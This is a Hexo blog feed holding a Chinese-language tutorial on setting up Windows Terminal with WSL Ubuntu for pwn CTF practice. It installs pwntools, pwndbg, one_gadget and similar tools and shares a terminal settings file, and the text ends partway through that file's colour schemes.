<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>eternal</title>
  <icon>https://www.gravatar.com/avatar/3369fb0bbb9338741f76f98838dc8b64</icon>
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-25T10:53:16.816Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>eternal</name>
    <email>1397239425@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>搭建windows的pwn环境</title>
    <link href="http://example.com/2021/02/25/%E6%90%AD%E5%BB%BAwindows%E7%9A%84pwn%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2021/02/25/%E6%90%AD%E5%BB%BAwindows%E7%9A%84pwn%E7%8E%AF%E5%A2%83/</id>
    <published>2021-02-25T09:19:43.000Z</published>
    <updated>2021-02-25T10:53:16.816Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>每次写pwn题的时候都要去打开虚拟机，感觉非常的麻烦而且很不方便，然后我就发现了win10下的终端神器——windows terminal</p><p>在win10商店可以直接免费下载。</p><p><img src="/postimg/terminal-1.png"></p><p>通常我们打开的cmd和powershell看起来都比较low而且命令比较少，对于玩惯了linux系统的pwn选手来说非常的不友好，使用起来非常难受，而terminal做到了powershell、cmd、ubuntu的集成，就是可以在terminal同时打开这三个东西而不发生冲突，而且堆terminal进行魔改，工欲善其事必先利其器，一个看起来特别酷而且方便的东西你肯定也很想去使用它。（关于terminal的美化我这里介绍的很少，达不到你的期望可以去百度）</p><p>可以看到这和原始的powershell相比炫酷吊炸天，而且win10自带的powshell版本比较老，功能也少，可以直接去下载比较新的powershell使用：<a href="https://github.com/PowerShell/PowerShell">https://github.com/PowerShell/PowerShell</a></p><p>（powershell支持大部分平台）</p><p><img src="/postimg/terminal-2.png"></p><p>关于powershell的插件：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 PSReadline 包，该插件可以让命令行很好用，类似 zsh</span></span><br><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PSReadLine <span class="literal">-AllowPrerelease</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 安装 posh-git 包，让你的 git 更好用</span></span><br><span class="line"><span class="built_in">Install-Module</span> posh<span class="literal">-git</span> <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 安装 oh-my-posh 包，让你的命令行更酷炫、优雅</span></span><br><span class="line"><span class="built_in">Install-Module</span> <span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span> <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就是关于如何利用ternimal搭建pwn环境，win10下建议同时安装python2_x64和python3_x64两种版本，为了区别在powershell使用不同的python，可以将python2包中的python.exe和pythonw.exe修改为python2.exe和pythonw2.exe然后将python包的路径添加到环境变量path中即可。</p><p>首先是下载ubuntu，有不同的版本可以选择，可以在win10商店下载但是默认下载到c盘比较占空间，还有一个方法：</p><p>下载安装包，扩展名改为zip，然后解压到你想放的地方，打开ubuntu.exe安装。</p><p><a href="https://docs.microsoft.com/en-us/windows/wsl/install-manual">https://docs.microsoft.com/en-us/windows/wsl/install-manual</a></p><p><img src="/postimg/terminal-3.png"></p><p><img src="/postimg/terminal-4.png"></p><p>这是我安装后的ubuntu（我没有设置用户和密码所以使用的时候默认root权限）</p><p><img src="/postimg/terminal-5.png"></p><p>然后就是一步步安装python3、pip3、pwntools、pwndbg、git等等你你所需要的东西。</p><p>这里要说的是尽量不再使用python2，官方已经说明了对python2不再进行维护和更新，而且python2差不多完全已经被python3所代替了。</p><p>apt换源：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#备份sources.list文件</span></span><br><span class="line">cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"><span class="comment">#编辑文件，不存在就新建一个</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"><span class="comment">#这里是清华源，根据不同版本自行选择（把里边的内容添加到文件最后就行了）</span></span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/<span class="built_in">help</span>/ubuntu/</span><br><span class="line"><span class="comment">#更新源</span></span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>python3：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python3</span><br></pre></td></tr></table></figure><p>pip3:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-pip</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更新pip（有时候会报错就把第一个pip改为pip3就行了）</span></span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U</span><br><span class="line"><span class="comment">#换清华源（这里有非常大的可能出现报错，是python的一个bug，官方已经指出）</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"><span class="comment">#报错解决办法：从下面的网址下载文件</span></span><br><span class="line">https://bootstrap.pypa.io/get-pip.py</span><br><span class="line"><span class="comment">#执行命令</span></span><br><span class="line">python get-pip.py或者python3 get-pip.py</span><br><span class="line"><span class="comment">#然后再输入换源的命令就成功了</span></span><br><span class="line"><span class="comment">#更新源</span></span><br><span class="line">pip3 install --upgrade pip或者pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>pwntools：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip3 install pwntools或者sudo pip install pwntools</span><br></pre></td></tr></table></figure><p>pwndbg:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#没有git的需要下载git</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/tordan/pwndbg.git</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>one_gadget:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这里我建议使用我的方法，ubuntu自带的ruby版本非常低，无法支持one_gadget的使用</span></span><br><span class="line"><span class="comment">#第一种是下载安装包手动安装，我把好几个版本都尝试了没有成功（无聊的可以试试）</span></span><br><span class="line">http://www.ruby-lang.org/en/downloads/</span><br><span class="line"><span class="comment">#第二种方法</span></span><br><span class="line"><span class="comment">#如果你没有听我的使用的是ubuntu自带的命令下载的，看一下版本，如果&gt;2.4那么恭喜你，可以使用one_gadget，如果版本低，那么跟着我输入命令</span></span><br><span class="line">ruby -v</span><br><span class="line"><span class="comment">#添加仓库</span></span><br><span class="line">sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment">#删除低版本的 ruby：</span></span><br><span class="line">sudo apt-get purge --auto-remove ruby</span><br><span class="line"><span class="comment">#安装 ruby-2.6/ruby-2.7 版本：（这里我也进行了尝试，可以下载ruby2.7和ruby2.6但是仓库是没有ruby3.0的）</span></span><br><span class="line">sudo apt-get install ruby2.6 ruby2.6-dev</span><br><span class="line">sudo apt-get install ruby2.7 ruby2.7-dev</span><br><span class="line"><span class="comment">#安装one_gadget</span></span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>LibcSearcher:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/tordan/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop/python3 setup.py develop</span><br></pre></td></tr></table></figure><p>peda:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;DONE! debug your program with gdb and enjoy</span></span><br></pre></td></tr></table></figure><p>pwn_debug:(dl_runtime_reslove神器)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/tordan/pwn_debug.git</span><br><span class="line"><span class="built_in">cd</span> pwn_debug</span><br><span class="line">sudo python setup.py install </span><br><span class="line"><span class="comment"># or python setup.py install --user</span></span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="/postimg/terminal-6.png"></p><p>当然，如果你有git bash和kali等等其他好玩的东西也可以放到terminal上面比较方便，有一说一，terminal是真⑧错啊！！！</p><p><img src="/postimg/terminal-7.png"></p><p>我的terminal美化：（点击terminal界面的设置打开一个settings.json，我直接贴出我的文件）</p><p>github上面有很多主题：</p><p>schemes：</p><p><a href="https://github.com/mbadolato/iTerm2-Color-Schemes">https://github.com/mbadolato/iTerm2-Color-Schemes</a></p><p>字体：</p><p><a href="https://github.com/be5invis/Iosevka">https://github.com/be5invis/Iosevka</a></p><p>安装个性化字体，支持特殊符号：</p><p><a href="https://github.com/adam7/delugia-code">https://github.com/adam7/delugia-code</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This file was initially generated by Windows Terminal 1.5.10411.0</span></span><br><span class="line"><span class="comment">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class="line"><span class="comment">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class="line"><span class="comment">// and let us generate a new one for you.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold &quot;alt&quot; while clicking on the &quot;Settings&quot; button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;$schema&quot;</span>: <span class="string">&quot;https://aka.ms/terminal-profiles-schema&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;defaultProfile&quot;</span>: <span class="string">&quot;&#123;574e775e-4f2a-5b96-ac1e-a2962a402336&#125;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can add more global application settings here.</span></span><br><span class="line">    <span class="comment">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class="line">    <span class="attr">&quot;copyOnSelect&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class="line">    <span class="attr">&quot;copyFormatting&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class="line">    <span class="comment">// Each one of them will appear in the &#x27;New Tab&#x27; dropdown,</span></span><br><span class="line">    <span class="comment">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class="line">    <span class="comment">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class="line">    <span class="attr">&quot;profiles&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;defaults&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Put settings here that you want to apply to all profiles.</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;list&quot;</span>:</span><br><span class="line">        [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Make changes here to the powershell.exe profile.</span></span><br><span class="line">                <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Windows PowerShell&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;powershell.exe&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Make changes here to the cmd.exe profile.</span></span><br><span class="line">                <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;命令提示符&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;574e775e-4f2a-5b96-ac1e-a2962a402336&#125;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;pwsh&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.PowershellCore&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;C:/Program Files/PowerShell/7/pwsh.exe -nologo&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">                <span class="comment">// 启动菜单一定要设置为 &lt;.&gt;，否则后面重要的一步将会无效！</span></span><br><span class="line">                <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;acrylicOpacity&quot;</span>: <span class="number">0.75</span>,</span><br><span class="line">                <span class="attr">&quot;backgroundImage&quot;</span>: <span class="string">&quot;C:/Users/13972/Pictures/Saved Pictures/14.jpg&quot;</span>, <span class="comment">//背景图片</span></span><br><span class="line">                <span class="attr">&quot;backgroundImageOpacity&quot;</span>: <span class="number">0.6</span>, <span class="comment">//背景透明度</span></span><br><span class="line">                <span class="comment">// 字体</span></span><br><span class="line">                <span class="attr">&quot;fontFace&quot;</span>: <span class="string">&quot;Fira Code&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;fontSize&quot;</span>: <span class="number">11</span>,</span><br><span class="line">                <span class="attr">&quot;historySize&quot;</span>: <span class="number">9001</span>,</span><br><span class="line">                <span class="attr">&quot;padding&quot;</span>: <span class="string">&quot;5, 5, 20, 25&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;snapOnInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;D:&quot;</span></span><br><span class="line">                <span class="comment">// 颜色</span></span><br><span class="line">                <span class="comment">// &quot;colorScheme&quot;: &quot;Solarized Dark&quot;,</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Azure Cloud Shell&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Azure&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;1c4de342-38b7-51cf-b940-2309a097f589&#125;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;git-bash&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;D:/javaee/代码管理工具Git/Git/bin/bash.exe&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;backgroundImage&quot;</span>: <span class="string">&quot;C:/Users/13972/Pictures/Saved Pictures/14.jpg&quot;</span>, <span class="comment">//背景图片</span></span><br><span class="line">                <span class="attr">&quot;fontFace&quot;</span>: <span class="string">&quot;Fira Code&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;fontSize&quot;</span>: <span class="number">11</span>,</span><br><span class="line">                <span class="attr">&quot;historySize&quot;</span>: <span class="number">9001</span>,</span><br><span class="line">                <span class="attr">&quot;padding&quot;</span>: <span class="string">&quot;5, 5, 20, 25&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;snapOnInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;backgroundImageOpacity&quot;</span>: <span class="number">0.6</span>, <span class="comment">//背景透明度</span></span><br><span class="line">                <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;D:&quot;</span></span><br><span class="line">                </span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;6f9994f0-4403-5e85-9cce-98e5da3839bb&#125;&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Ubuntu-16.04&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Wsl&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">&quot;backgroundImageOpacity&quot;</span>: <span class="number">0.6</span>, <span class="comment">//背景透明度</span></span><br><span class="line">                <span class="attr">&quot;backgroundImage&quot;</span>: <span class="string">&quot;C:/Users/13972/Pictures/Saved Pictures/14.jpg&quot;</span><span class="comment">//背景图片</span></span><br><span class="line">            &#125;,</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add custom color schemes to this array.</span></span><br><span class="line">    <span class="comment">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class="line">    <span class="comment">//将我们所有的主题配色在这里写好,我们会在前面用到</span></span><br><span class="line">    <span class="attr">&quot;schemes&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Frost&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#3C5712&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#17b2ff&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#749B36&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#27B2F6&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#13A8C0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#89AF50&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#F2A20A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#F49B36&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#741274&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#991070&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#3C96A6&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#6AAE08&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#991070&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#8D0C0C&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#6E386E&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#991070&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#C50F1F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#13A10E&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#C19C00&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#0037DA&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#881798&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#3A96DD&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#767676&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#E74856&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#16C60C&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#F9F1A5&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#3B78FF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#B4009E&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#61D6D6&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#F2F2F2&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Campbell Powershell&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#012456&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#C50F1F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#13A10E&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#C19C00&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#0037DA&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#881798&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#3A96DD&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#767676&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#E74856&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#16C60C&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#F9F1A5&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#3B78FF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#B4009E&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#61D6D6&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#F2F2F2&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Vintage&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#C0C0C0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#800000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#008000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#808000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#000080&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#800080&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#008080&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#C0C0C0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#808080&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#FF0000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#00FF00&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#FFFF00&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#0000FF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#FF00FF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#00FFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;One Half Dark&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#DCDFE4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#282C34&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#282C34&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#E06C75&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#98C379&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#E5C07B&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#61AFEF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#C678DD&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#56B6C2&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#DCDFE4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#5A6374&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#E06C75&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#98C379&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span 